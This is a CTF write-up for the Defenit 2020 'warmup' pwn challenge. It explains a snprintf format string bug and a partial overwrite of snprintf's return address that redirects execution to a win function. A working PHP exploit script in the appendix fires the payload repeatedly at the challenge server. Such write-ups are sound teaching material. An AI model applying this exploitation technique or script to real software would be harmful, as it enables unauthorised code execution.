# warmup - 2020 Defenit CTF (pwn, 316p, 32 solved)
## Introduction

warmup is a pwn task.

A binary, and a libc are provided.

The libc provided is `Ubuntu GLIBC 2.23-0ubuntu11`.

## Reverse engineering

The binary is quite small and has symbols.

It opens `flag.txt`. It then reads `0x100` bytes in a buffer from the standard
input, and calls `snprintf` on it, resulting in a format string vulnerability.
It calls `exit` right after. It does not display anything, which makes it
impossible to leak memory.

There is a `win` function that displays the flag. It is located right after the
vulnerable function.


## Exploitation

The author of this challenge expects players to redirect the flow of execution
to the `win` function.

The format string vulnerability allows an attacker to overwrite arbitrary
memory. ASLR + PIE means that the attacker is restricted to addresses that are
left on the stack. PIE also means that the overwritten pointer has to be already
pointing to the main binary's mapping.

The binary is `relro`. Overwriting the `.got.plt` is not an option.

The vulnerable function never returns. It calls `exit` that calls a few hooks
(TLS destructors, `atexit` functions, etc.). Tracing the execution shows no
hooks that can be overwritten and whose function is located in the main binary's
mappings.

`snprintf` uses a return address. It is possible to overwrite it during its
call, which will make it return to a different address.

`snprintf` originally returns to `$base + 00000a0a`, which is conveniently very
close to the `win` function, located in `$base + 00000a14`. Partially
overwriting the last byte of the return address to `0x14` will thus make the
call to `snprintf` return to the `win` function.

There are no pointers to `snprintf`'s return address on the stack. However,
there is a pointer to a stack address that contains an other stack address.

```
0x7fffffffda20:	0x00007fffffffda30	0x473734f9ce51ca00
0x7fffffffda30:	0x00007fffffffda40	0x0000000100000a89
```

It is possible to overwrite the second pointer (`0x7fffffffda30`) to make it
point what would be the return address of `snprintf`.

With ASLR, this has a reasonable chance of success. It is possible to run a
script multiple time in parallel to get the flag faster.


**Flag**: `Defenit{printf_r3t_0v3rwrit3}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
const HOST = "warmup.ctf.defenit.kr";
const PORT = 3333;

$payload  = str_repeat("%c", 66);
$payload .= "%" . (0xD2F8 - 66) . "c";
$payload .= "%hn";

$payload .= "%" . (0xFF & (0x14 - 0xF8)) . "c"; // skip canary + adjust
$payload .= "%hhn";
$payload .= "\x00";

$host = gethostbyname(HOST);
$port = PORT;
$exit = false;

while(!$exit) {
	$socket = socket_create(2, 1, 0);
	if(false === $socket)
		exit(1);

	if(!socket_connect($socket, $host, $port))
		exit(2);

	socket_write($socket, $payload);
	while("" !== ($packet = socket_read($socket, 4096))) {
		echo $packet;
		$exit = true;
	}
}
```
